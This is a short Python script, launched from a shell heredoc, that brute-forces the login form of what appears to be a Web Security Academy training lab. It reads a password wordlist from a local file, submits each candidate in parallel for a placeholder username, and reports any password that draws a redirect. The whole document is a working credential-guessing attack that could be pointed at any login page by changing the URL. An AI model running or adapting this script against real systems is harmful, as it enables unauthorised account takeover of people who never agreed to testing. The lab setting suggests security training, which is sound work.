python3 - <<'EOF'
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

base_url = "https://0a5500f90411675380a99941001c0077.web-security-academy.net"

with open("C:/Users/malik/Downloads/passwords.txt") as f:
    passwords = [line.strip() for line in f]

def check(password):
    r = requests.post(
        f"{base_url}/login",
        data={"username": "USERNAME", "password": password},
        allow_redirects=False
    )
    if r.status_code == 302:
        return f"[LOGIN SUCCESS] {password}"
    return None

with ThreadPoolExecutor(max_workers=10) as ex:
    futures = {ex.submit(check, p): p for p in passwords}
    for f in as_completed(futures):
        result = f.result()
        if result:
            print(result)
EOF
